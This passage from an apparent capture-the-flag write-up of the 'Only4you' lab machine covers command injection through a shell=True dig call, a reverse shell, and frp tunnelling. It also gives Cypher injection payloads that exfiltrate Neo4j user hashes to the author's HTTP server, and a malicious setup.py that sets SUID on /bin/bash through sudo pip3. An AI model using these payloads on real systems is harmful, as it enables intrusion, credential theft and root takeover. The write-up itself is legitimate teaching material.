</span></span><span style=display:flex><span>                <span style=color:#fb660a;font-weight:700>if</span> <span style=color:#0086d2>&#34;v=spf1&#34;</span> not in output:
</span></span><span style=display:flex><span>                        <span style=color:#fb660a;font-weight:700>return</span> <span style=color:#0086f7;font-weight:700>1</span>
</span></span><span style=display:flex><span>                <span style=color:#fb660a;font-weight:700>else</span>:
</span></span><span style=display:flex><span>                        domains = []
</span></span><span style=display:flex><span>                        ips = []
</span></span><span style=display:flex><span>                        <span style=color:#fb660a;font-weight:700>if</span> <span style=color:#0086d2>&#34;include:&#34;</span> in output:
</span></span><span style=display:flex><span>                                dms = <span style=color:#0086d2>&#39;&#39;</span>.join(re.findall(<span style=color:#0086d2>r</span><span style=color:#0086d2>&#34;include:.*\.[A-Z|a-z]{2,}&#34;</span>, output)).split(<span style=color:#0086d2>&#34;include:&#34;</span>)
</span></span><span style=display:flex><span>                                dms.pop(<span style=color:#0086f7;font-weight:700>0</span>)
</span></span><span style=display:flex><span>                                <span style=color:#fb660a;font-weight:700>for</span> domain in dms:
</span></span><span style=display:flex><span>                                        domains.append(domain)
</span></span><span style=display:flex><span>                                <span style=color:#fb660a;font-weight:700>while</span> <span style=color:#fb660a;font-weight:700>True</span>:
</span></span><span style=display:flex><span>                                        <span style=color:#fb660a;font-weight:700>for</span> domain in domains:
</span></span><span style=display:flex><span>                                                result = run([<span style=color:#0086d2>f</span><span style=color:#0086d2>&#34;dig txt </span><span style=color:#0086d2>{</span>domain<span style=color:#0086d2>}</span><span style=color:#0086d2>&#34;</span>], shell=<span style=color:#fb660a;font-weight:700>True</span>, stdout=PIPE)
</span></span><span style=display:flex><span>                                                output = result.stdout.decode(<span style=color:#0086d2>&#39;utf-8&#39;</span>)
</span></span><span style=display:flex><span>                                                <span style=color:#fb660a;font-weight:700>if</span> <span style=color:#0086d2>&#34;include:&#34;</span> in output:
</span></span><span style=display:flex><span>                                                        dms = <span style=color:#0086d2>&#39;&#39;</span>.join(re.findall(<span style=color:#0086d2>r</span><span style=color:#0086d2>&#34;include:.*\.[A-Z|a-z]{2,}&#34;</span>, output)).split(<span style=color:#0086d2>&#34;include:&#34;</span>)
</span></span><span style=display:flex><span>                                                        domains.clear()
</span></span><span style=display:flex><span>                                                        <span style=color:#fb660a;font-weight:700>for</span> domain in dms:
</span></span><span style=display:flex><span>                                                                domains.append(domain)
</span></span><span style=display:flex><span>                                                <span style=color:#fb660a;font-weight:700>elif</span> <span style=color:#0086d2>&#34;ip4:&#34;</span> in output:
</span></span><span style=display:flex><span>                                                        ipaddresses = <span style=color:#0086d2>&#39;&#39;</span>.join(re.findall(<span style=color:#0086d2>r</span><span style=color:#0086d2>&#34;ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]</span><span style=color:#0086d2>{2}</span><span style=color:#0086d2>&#34;</span>, output)).split(<span style=color:#0086d2>&#34;ip4:&#34;</span>)
</span></span><span style=display:flex><span>                                                        ipaddresses.pop(<span style=color:#0086f7;font-weight:700>0</span>)
</span></span><span style=display:flex><span>                                                        <span style=color:#fb660a;font-weight:700>for</span> i in ipaddresses:
</span></span><span style=display:flex><span>                                                                ips.append(i)
</span></span><span style=display:flex><span>                                                <span style=color:#fb660a;font-weight:700>else</span>:
</span></span><span style=display:flex><span>                                                        <span style=color:#fb660a;font-weight:700>pass</span>
</span></span><span style=display:flex><span>                                        <span style=color:#fb660a;font-weight:700>break</span>
</span></span><span style=display:flex><span>                        <span style=color:#fb660a;font-weight:700>elif</span> <span style=color:#0086d2>&#34;ip4&#34;</span> in output:
</span></span><span style=display:flex><span>                                ipaddresses = <span style=color:#0086d2>&#39;&#39;</span>.join(re.findall(<span style=color:#0086d2>r</span><span style=color:#0086d2>&#34;ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]</span><span style=color:#0086d2>{2}</span><span style=color:#0086d2>&#34;</span>, output)).split(<span style=color:#0086d2>&#34;ip4:&#34;</span>)
</span></span><span style=display:flex><span>                                ipaddresses.pop(<span style=color:#0086f7;font-weight:700>0</span>)
</span></span><span style=display:flex><span>                                <span style=color:#fb660a;font-weight:700>for</span> i in ipaddresses:
</span></span><span style=display:flex><span>                                        ips.append(i)
</span></span><span style=display:flex><span>                        <span style=color:#fb660a;font-weight:700>else</span>:
</span></span><span style=display:flex><span>                                <span style=color:#fb660a;font-weight:700>return</span> <span style=color:#0086f7;font-weight:700>1</span>
</span></span><span style=display:flex><span>                <span style=color:#fb660a;font-weight:700>for</span> i in ips:
</span></span><span style=display:flex><span>                        <span style=color:#fb660a;font-weight:700>if</span> ip == i:
</span></span><span style=display:flex><span>                                <span style=color:#fb660a;font-weight:700>return</span> <span style=color:#0086f7;font-weight:700>2</span>
</span></span><span style=display:flex><span>                        <span style=color:#fb660a;font-weight:700>elif</span> ipaddress.ip_address(ip) in ipaddress.ip_network(i):
</span></span><span style=display:flex><span>                                <span style=color:#fb660a;font-weight:700>return</span> <span style=color:#0086f7;font-weight:700>2</span>
</span></span><span style=display:flex><span>                        <span style=color:#fb660a;font-weight:700>else</span>:
</span></span><span style=display:flex><span>                                <span style=color:#fb660a;font-weight:700>return</span> <span style=color:#0086f7;font-weight:700>1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>def</span> <span style=color:#ff0086;font-weight:700>sendmessage</span>(email, subject, message, ip):
</span></span><span style=display:flex><span>        status = issecure(email, ip)
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>if</span> status == <span style=color:#0086f7;font-weight:700>2</span>:
</span></span><span style=display:flex><span>                msg = EmailMessage()
</span></span><span style=display:flex><span>                msg[<span style=color:#0086d2>&#39;From&#39;</span>] = <span style=color:#0086d2>f</span><span style=color:#0086d2>&#39;</span><span style=color:#0086d2>{</span>email<span style=color:#0086d2>}</span><span style=color:#0086d2>&#39;</span>
</span></span><span style=display:flex><span>                msg[<span style=color:#0086d2>&#39;To&#39;</span>] = <span style=color:#0086d2>&#39;info@only4you.htb&#39;</span>
</span></span><span style=display:flex><span>                msg[<span style=color:#0086d2>&#39;Subject&#39;</span>] = <span style=color:#0086d2>f</span><span style=color:#0086d2>&#39;</span><span style=color:#0086d2>{</span>subject<span style=color:#0086d2>}</span><span style=color:#0086d2>&#39;</span>
</span></span><span style=display:flex><span>                msg[<span style=color:#0086d2>&#39;Message&#39;</span>] = <span style=color:#0086d2>f</span><span style=color:#0086d2>&#39;</span><span style=color:#0086d2>{</span>message<span style=color:#0086d2>}</span><span style=color:#0086d2>&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                smtp = smtplib.SMTP(host=<span style=color:#0086d2>&#39;localhost&#39;</span>, port=<span style=color:#0086f7;font-weight:700>25</span>)
</span></span><span style=display:flex><span>                smtp.send_message(msg)
</span></span><span style=display:flex><span>                smtp.quit()
</span></span><span style=display:flex><span>                <span style=color:#fb660a;font-weight:700>return</span> status
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>elif</span> status == <span style=color:#0086f7;font-weight:700>1</span>:
</span></span><span style=display:flex><span>                <span style=color:#fb660a;font-weight:700>return</span> status
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>else</span>:
</span></span><span style=display:flex><span>                <span style=color:#fb660a;font-weight:700>return</span> status
</span></span></code></pre></div><p>Notice the function <code>issecure</code> is vulnerable to RCE, because of this line <code>result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)</code>. You will see that app.py calls the function <code>sendmessage</code> from form.py script, and <code>sendmessage()</code> calls <code>issecure(email, ip)</code>, so <code>email</code> field is vulnerable to injection.</p><p>So I tried to curl my localhost and it succeded. Now getting a rev shell:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>z➤ nc -lvnp <span style=color:#0086f7;font-weight:700>55555</span>
</span></span><span style=display:flex><span>Connection from 10.10.11.210:48762
</span></span><span style=display:flex><span>bash: cannot set terminal process group (1015): Inappropriate ioctl <span style=color:#fb660a;font-weight:700>for</span> device
</span></span><span style=display:flex><span>bash: no job control in this shell
</span></span><span style=display:flex><span>www-data@only4you:~/only4you.htb$ id
</span></span><span style=display:flex><span>id
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=33(www-data) <span style=color:#fb660a>gid</span>=33(www-data) <span style=color:#fb660a>groups</span>=33(www-data)
</span></span><span style=display:flex><span>www-data@only4you:~/only4you.htb$ pwd
</span></span><span style=display:flex><span>pwd
</span></span><span style=display:flex><span>/var/www/only4you.htb
</span></span></code></pre></div><h4 id=exposing-internal-services>Exposing internal services
<a class=heading-link href=#exposing-internal-services><i class="fa fa-link" aria-hidden=true></i></a></h4><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>www-data@only4you:~/only4you.htb$ netstat -tulpn | grep 127.0.0.1
</span></span><span style=display:flex><span>netstat -tulpn | grep 127.0.0.1
</span></span><span style=display:flex><span>tcp        <span style=color:#0086f7;font-weight:700>0</span>      <span style=color:#0086f7;font-weight:700>0</span> 127.0.0.1:8001          0.0.0.0:*               LISTEN      -
</span></span><span style=display:flex><span>tcp        <span style=color:#0086f7;font-weight:700>0</span>      <span style=color:#0086f7;font-weight:700>0</span> 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
</span></span><span style=display:flex><span>tcp        <span style=color:#0086f7;font-weight:700>0</span>      <span style=color:#0086f7;font-weight:700>0</span> 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
</span></span><span style=display:flex><span>tcp        <span style=color:#0086f7;font-weight:700>0</span>      <span style=color:#0086f7;font-weight:700>0</span> 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
</span></span><span style=display:flex><span>tcp6       <span style=color:#0086f7;font-weight:700>0</span>      <span style=color:#0086f7;font-weight:700>0</span> 127.0.0.1:7687          :::*                    LISTEN      -
</span></span><span style=display:flex><span>tcp6       <span style=color:#0086f7;font-weight:700>0</span>      <span style=color:#0086f7;font-weight:700>0</span> 127.0.0.1:7474          :::*                    LISTEN      -
</span></span></code></pre></div><p>We see some interal ports LISTENing, let&rsquo;s expose them and see what they have are running. For this matter I used this popular tool
<a href=https://github.com/fatedier/frp>https://github.com/fatedier/frp</a></p><p>It helps to rapidly expose local servers to ouside in different ways. It uses two programs one for the internal server and one for the client.</p><p>I will just start the client app on my workstation:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>z➤ ./frps -p <span style=color:#0086f7;font-weight:700>7000</span> --bind_addr <span style=color:#0086d2>&#34;0.0.0.0&#34;</span>
</span></span><span style=display:flex><span>2023/08/16 22:03:14 [I] [root.go:206] frps uses command line arguments <span style=color:#fb660a;font-weight:700>for</span> config
</span></span><span style=display:flex><span>2023/08/16 22:03:14 [I] [service.go:206] frps tcp listen on 0.0.0.0:7000
</span></span><span style=display:flex><span>2023/08/16 22:03:14 [I] [root.go:213] frps started successfully
</span></span></code></pre></div><p>Now I will run the &ldquo;exposer&rdquo; app on the server from user <code>www-data</code>, it requires a config file <code>frpc.ini</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-text data-lang=text><span style=display:flex><span>[common]
</span></span><span style=display:flex><span>server_addr = 10.10.14.3
</span></span><span style=display:flex><span>server_port = 7000
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>[aa]
</span></span><span style=display:flex><span>type = tcp
</span></span><span style=display:flex><span>local_ip = 127.0.0.1
</span></span><span style=display:flex><span>local_port = 3000
</span></span><span style=display:flex><span>remote_port = 3000
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>[bb]
</span></span><span style=display:flex><span>type = tcp
</span></span><span style=display:flex><span>local_ip = 127.0.0.1
</span></span><span style=display:flex><span>local_port = 8001
</span></span><span style=display:flex><span>remote_port = 8001
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>[cc]
</span></span><span style=display:flex><span>type = tcp
</span></span><span style=display:flex><span>local_ip = 127.0.0.1
</span></span><span style=display:flex><span>local_port = 7474
</span></span><span style=display:flex><span>remote_port = 7474
</span></span></code></pre></div><p>Now I can run the app:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>www-data@only4you:~/only4you.htb$ nohup ./frpc -c frpc001.ini &amp;
</span></span><span style=display:flex><span>nohup ./frpc -c frpc001.ini &amp;
</span></span><span style=display:flex><span>[1] <span style=color:#0086f7;font-weight:700>3558</span>
</span></span><span style=display:flex><span>www-data@only4you:~/only4you.htb$ 2023/08/17 02:14:45 [I] [root.go:220] start frpc service <span style=color:#fb660a;font-weight:700>for</span> config file [frpc001.ini]
</span></span><span style=display:flex><span>2023/08/17 02:14:45 [I] [service.go:301] [99ab7b3792eb61fe] login to server success, get run id [99ab7b3792eb61fe]
</span></span><span style=display:flex><span>2023/08/17 02:14:45 [I] [proxy_manager.go:150] [99ab7b3792eb61fe] proxy added: [aa bb cc]
</span></span><span style=display:flex><span>2023/08/17 02:14:45 [I] [control.go:172] [99ab7b3792eb61fe] [aa] start proxy success
</span></span><span style=display:flex><span>2023/08/17 02:14:45 [I] [control.go:172] [99ab7b3792eb61fe] [bb] start proxy success
</span></span><span style=display:flex><span>2023/08/17 02:14:45 [I] [control.go:172] [99ab7b3792eb61fe] [cc] start proxy success
</span></span></code></pre></div><p>Now we can access multiple pages:</p><p><figure class=image-container><a href=/i/2023-08-16_22-16.png><img width=100% src=/i/2023-08-16_22-16.png alt="Login app"></a><figcaption>&#8213; Login app &#8213;</figcaption></figure><figure class=image-container><a href=/i/2023-08-16_22-17.png><img width=100% src=/i/2023-08-16_22-17.png alt="Git repos hosting"></a><figcaption>&#8213; Git repos hosting &#8213;</figcaption></figure><figure class=image-container><a href=/i/2023-08-16_22-17_1.png><img width=100% src=/i/2023-08-16_22-17_1.png alt="Neo4j dashboard"></a><figcaption>&#8213; Neo4j dashboard &#8213;</figcaption></figure></p><p>So the webapp running on port <code>8001</code> has a default user/password: <code>admin:admin</code>. In there we can see a search page which is vulnerable to SQLi for Neo4j:<figure class=image-container><a href=/i/2023-08-16_22-27.png><img width=100% src=/i/2023-08-16_22-27.png alt=SQLi></a><figcaption>&#8213; SQLi &#8213;</figcaption></figure>We can get the SQLi from
<a href=https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j>https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j</a></p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#0086d2>&#39; OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM &#39;</span>http://<span style=color:#0086f7;font-weight:700>10</span>.<span style=color:#0086f7;font-weight:700>0</span>.<span style=color:#0086f7;font-weight:700>2</span>.<span style=color:#0086f7;font-weight:700>4</span>:<span style=color:#0086f7;font-weight:700>8000</span>/?<span style=color:#fb660a;font-weight:700>version</span>=<span style=color:#0086d2>&#39; + version + &#39;</span>&amp;name=<span style=color:#0086d2>&#39; + name + &#39;</span>&amp;edition=<span style=color:#0086d2>&#39; + edition as l RETURN 0 as _0 // 
</span></span></span></code></pre></div><p>Where <code>http://10.0.2.4:8000</code> should be a dummy server we run, so we can see requests and their params.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~/tmp➤ python -m http.server <span style=color:#0086f7;font-weight:700>6666</span>
</span></span><span style=display:flex><span>Serving HTTP on 0.0.0.0 port <span style=color:#0086f7;font-weight:700>6666</span> (http://0.0.0.0:6666/) ...
</span></span><span style=display:flex><span>10.10.11.210 - - [16/Aug/2023 22:25:44] code 400, message Bad request syntax (<span style=color:#0086d2>&#39;GET /?version=5.6.0&amp;name=Neo4j Kernel&amp;edition=community HTTP/1.1&#39;</span>)
</span></span><span style=display:flex><span>10.10.11.210 - - [16/Aug/2023 22:25:44] <span style=color:#0086d2>&#34;GET /?version=5.6.0&amp;name=Neo4j Kernel&amp;edition=community HTTP/1.1&#34;</span> <span style=color:#0086f7;font-weight:700>400</span> -
</span></span></code></pre></div><p>Getting all labels from db: <code>1' OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://10.10.14.3:6666/?label='+label as l RETURN 0 as _0 //</code></p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>10.10.11.210 - - [16/Aug/2023 22:39:13] <span style=color:#0086d2>&#34;GET /?label=user HTTP/1.1&#34;</span> <span style=color:#0086f7;font-weight:700>200</span> -
</span></span><span style=display:flex><span>10.10.11.210 - - [16/Aug/2023 22:39:14] <span style=color:#0086d2>&#34;GET /?label=employee HTTP/1.1&#34;</span> <span style=color:#0086f7;font-weight:700>200</span> -
</span></span><span style=display:flex><span>10.10.11.210 - - [16/Aug/2023 22:39:14] <span style=color:#0086d2>&#34;GET /?label=user HTTP/1.1&#34;</span> <span style=color:#0086f7;font-weight:700>200</span> -
</span></span><span style=display:flex><span>10.10.11.210 - - [16/Aug/2023 22:39:14] <span style=color:#0086d2>&#34;GET /?label=employee HTTP/1.1&#34;</span> <span style=color:#0086f7;font-weight:700>200</span> -
</span></span><span style=display:flex><span>10.10.11.210 - - [16/Aug/2023 22:39:15] <span style=color:#0086d2>&#34;GET /?label=user HTTP/1.1&#34;</span> <span style=color:#0086f7;font-weight:700>200</span> -
</span></span><span style=display:flex><span>10.10.11.210 - - [16/Aug/2023 22:39:15] <span style=color:#0086d2>&#34;GET /?label=employee HTTP/1.1&#34;</span> <span style=color:#0086f7;font-weight:700>200</span> -
</span></span><span style=display:flex><span>10.10.11.210 - - [16/Aug/2023 22:39:15] <span style=color:#0086d2>&#34;GET /?label=user HTTP/1.1&#34;</span> <span style=color:#0086f7;font-weight:700>200</span> -
</span></span><span style=display:flex><span>10.10.11.210 - - [16/Aug/2023 22:39:15] <span style=color:#0086d2>&#34;GET /?label=employee HTTP/1.1&#34;</span> <span style=color:#0086f7;font-weight:700>200</span> -
</span></span><span style=display:flex><span>10.10.11.210 - - [16/Aug/2023 22:39:16] <span style=color:#0086d2>&#34;GET /?label=user HTTP/1.1&#34;</span> <span style=color:#0086f7;font-weight:700>200</span> -
</span></span><span style=display:flex><span>10.10.11.210 - - [16/Aug/2023 22:39:16] <span style=color:#0086d2>&#34;GET /?label=employee HTTP/1.1&#34;</span> <span style=color:#0086f7;font-weight:700>200</span> -
</span></span></code></pre></div><p>Dumping data from user label db: <code>1' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.3:6666/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //</code></p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>10.10.11.210 - - [16/Aug/2023 22:40:34] <span style=color:#0086d2>&#34;GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1&#34;</span> <span style=color:#0086f7;font-weight:700>200</span> -
</span></span><span style=display:flex><span>10.10.11.210 - - [16/Aug/2023 22:40:35] <span style=color:#0086d2>&#34;GET /?username=admin HTTP/1.1&#34;</span> <span style=color:#0086f7;font-weight:700>200</span> -
</span></span><span style=display:flex><span>10.10.11.210 - - [16/Aug/2023 22:40:35] <span style=color:#0086d2>&#34;GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1&#34;</span> <span style=color:#0086f7;font-weight:700>200</span> -
</span></span><span style=display:flex><span>10.10.11.210 - - [16/Aug/2023 22:40:35] <span style=color:#0086d2>&#34;GET /?username=john HTTP/1.1&#34;</span> <span style=color:#0086f7;font-weight:700>200</span> -
</span></span><span style=display:flex><span>10.10.11.210 - - [16/Aug/2023 22:40:36] <span style=color:#0086d2>&#34;GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1&#34;</span> <span style=color:#0086f7;font-weight:700>200</span> -
</span></span><span style=display:flex><span>10.10.11.210 - - [16/Aug/2023 22:40:36] <span style=color:#0086d2>&#34;GET /?username=admin HTTP/1.1&#34;</span> <span style=color:#0086f7;font-weight:700>200</span> -
</span></span><span style=display:flex><span>10.10.11.210 - - [16/Aug/2023 22:40:36] <span style=color:#0086d2>&#34;GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1&#34;</span> <span style=color:#0086f7;font-weight:700>200</span> -
</span></span><span style=display:flex><span>10.10.11.210 - - [16/Aug/2023 22:40:36] <span style=color:#0086d2>&#34;GET /?username=john HTTP/1.1&#34;</span> <span style=color:#0086f7;font-weight:700>200</span> -
</span></span><span style=display:flex><span>10.10.11.210 - - [16/Aug/2023 22:40:37] <span style=color:#0086d2>&#34;GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1&#34;</span> <span style=color:#0086f7;font-weight:700>200</span> -
</span></span><span style=display:flex><span>10.10.11.210 - - [16/Aug/2023 22:40:37] <span style=color:#0086d2>&#34;GET /?username=admin HTTP/1.1&#34;</span> <span style=color:#0086f7;font-weight:700>200</span> -
</span></span><span style=display:flex><span>10.10.11.210 - - [16/Aug/2023 22:40:37] <span style=color:#0086d2>&#34;GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1&#34;</span> <span style=color:#0086f7;font-weight:700>200</span> -
</span></span><span style=display:flex><span>10.10.11.210 - - [16/Aug/2023 22:40:38] <span style=color:#0086d2>&#34;GET /?username=john HTTP/1.1&#34;</span> <span style=color:#0086f7;font-weight:700>200</span> -
</span></span><span style=display:flex><span>10.10.11.210 - - [16/Aug/2023 22:40:38] <span style=color:#0086d2>&#34;GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1&#34;</span> <span style=color:#0086f7;font-weight:700>200</span> -
</span></span></code></pre></div><p>Looking into crackstation to see if there is something cracked there already:<figure class=image-container><a href=/i/2023-08-16_22-42.png><img width=100% src=/i/2023-08-16_22-42.png alt=Crackstation></a><figcaption>&#8213; Crackstation &#8213;</figcaption></figure></p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>john@only4you:~$ id
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=1000(john) <span style=color:#fb660a>gid</span>=1000(john) <span style=color:#fb660a>groups</span>=1000(john)
</span></span><span style=display:flex><span>john@only4you:~$ ls
</span></span><span style=display:flex><span>user.txt
</span></span><span style=display:flex><span>john@only4you:~$
</span></span></code></pre></div><h2 id=root-flag>Root Flag
<a class=heading-link href=#root-flag><i class="fa fa-link" aria-hidden=true></i></a></h2><p>We have to do something with <code>pip</code> to escalate:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>john@only4you:~$ sudo -l
</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#fb660a;font-weight:700>for</span> john on only4you:
</span></span><span style=display:flex><span>    env_reset, mail_badpass, <span style=color:#fb660a>secure_path</span>=/usr/local/sbin<span style=color:#0086d2>\:</span>/usr/local/bin<span style=color:#0086d2>\:</span>/usr/sbin<span style=color:#0086d2>\:</span>/usr/bin<span style=color:#0086d2>\:</span>/sbin<span style=color:#0086d2>\:</span>/bin<span style=color:#0086d2>\:</span>/snap/bin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User john may run the following commands on only4you:
</span></span><span style=display:flex><span>    (root) NOPASSWD: /usr/bin/pip3 download http<span style=color:#0086d2>\:</span>//127.0.0.1<span style=color:#0086d2>\:</span>3000/*.tar.gz
</span></span></code></pre></div><h4 id=building-a-malicious-pip-package>Building a malicious pip package
<a class=heading-link href=#building-a-malicious-pip-package><i class="fa fa-link" aria-hidden=true></i></a></h4><p>So lets create a malicious setup.py and then we build our pip package, we can see the reference here:
<a href=https://github.com/wunderwuzzi23/this_is_fine_wuzzi>https://github.com/wunderwuzzi23/this_is_fine_wuzzi</a></p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#fb660a;font-weight:700>import</span> os
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>from</span> setuptools <span style=color:#fb660a;font-weight:700>import</span> setup, find_packages
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>from</span> setuptools.command.install <span style=color:#fb660a;font-weight:700>import</span> install
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>from</span> setuptools.command.egg_info <span style=color:#fb660a;font-weight:700>import</span> egg_info
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>def</span> <span style=color:#ff0086;font-weight:700>RunCommand</span>():
</span></span><span style=display:flex><span>    print(<span style=color:#0086d2>&#34;Hello, p0wnd!&#34;</span>)
</span></span><span style=display:flex><span>    os.system(<span style=color:#0086d2>&#34;chmod +s /bin/bash&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>class</span> RunEggInfoCommand(egg_info):
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>def</span> <span style=color:#ff0086;font-weight:700>run</span>(self):
</span></span><span style=display:flex><span>        RunCommand()
</span></span><span style=display:flex><span>        egg_info.run(self)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>class</span> RunInstallCommand(install):
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>def</span> <span style=color:#ff0086;font-weight:700>run</span>(self):
</span></span><span style=display:flex><span>        RunCommand()
</span></span><span style=display:flex><span>        install.run(self)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>setup(
</span></span><span style=display:flex><span>    name = <span style=color:#0086d2>&#34;oops&#34;</span>,
</span></span><span style=display:flex><span>    version = <span style=color:#0086d2>&#34;0.0.1&#34;</span>,
</span></span><span style=display:flex><span>    license = <span style=color:#0086d2>&#34;MIT&#34;</span>,
</span></span><span style=display:flex><span>    packages=find_packages(),
</span></span><span style=display:flex><span>    cmdclass={
</span></span><span style=display:flex><span>        <span style=color:#0086d2>&#39;install&#39;</span> : RunInstallCommand,
</span></span><span style=display:flex><span>        <span style=color:#0086d2>&#39;egg_info&#39;</span>: RunEggInfoCommand
</span></span><span style=display:flex><span>    },
</span></span><span style=display:flex><span>)
</span></span></code></pre></div><p>Now we build the pip package:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~/tmp/dummy➤ python -m build
</span></span><span style=display:flex><span>* Creating virtualenv isolated environment...
</span></span><span style=display:flex><span>* Installing packages in isolated environment... (setuptools &gt;= 40.8.0, wheel)
</span></span><span style=display:flex><span>* Getting build dependencies <span style=color:#fb660a;font-weight:700>for</span> sdist...
</span></span><span style=display:flex><span>running egg_info
</span></span><span style=display:flex><span>Hello, p0wnd!
</span></span><span style=display:flex><span>chmod: changing permissions of <span style=color:#0086d2>&#39;/bin/bash&#39;</span>: Operation not permitted
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>adding <span style=color:#0086d2>&#39;oops-0.0.1.dist-info/WHEEL&#39;</span>
</span></span><span style=display:flex><span>adding <span style=color:#0086d2>&#39;oops-0.0.1.dist-info/top_level.txt&#39;</span>
</span></span><span style=display:flex><span>adding <span style=color:#0086d2>&#39;oops-0.0.1.dist-info/RECORD&#39;</span>
</span></span><span style=display:flex><span>removing build/bdist.linux-x86_64/wheel
</span></span><span style=display:flex><span>Successfully built oops-0.0.1.tar.gz and oops-0.0.1-py3-none-any.whl
</span></span></code></pre></div><p>The malicious pip package can only be installed via <code>http://127.0.0.1:3000</code>, that is the Gogs git internal service we saw before, so we just create a git repository (using same ssh creds in Gogs web page) and then upload the resultant malicious pip package:<figure class=image-container><a href=/i/2023-08-16_22-56.png><img width=100% src=/i/2023-08-16_22-56.png alt="Uploading vulnerable pip package"></a><figcaption>&#8213; Uploading vulnerable pip package &#8213;</figcaption></figure></p><p>We are root now:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>john@only4you:/etc/nginx/sites-enabled$ sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/oops/raw/master/oops-0.0.1.tar.gz
</span></span><span style=display:flex><span>Collecting http://127.0.0.1:3000/john/oops/raw/master/oops-0.0.1.tar.gz
